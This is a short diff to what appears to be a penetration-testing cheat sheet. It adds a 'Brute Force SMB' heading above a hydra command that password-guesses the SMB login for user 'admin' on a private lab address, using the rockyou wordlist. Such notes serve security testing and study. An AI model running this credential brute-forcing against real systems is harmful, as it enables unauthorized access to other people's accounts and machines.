@@ -1,3 +1,4 @@
+# Brute Force SMB
 ### hydra
 ````bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 smb
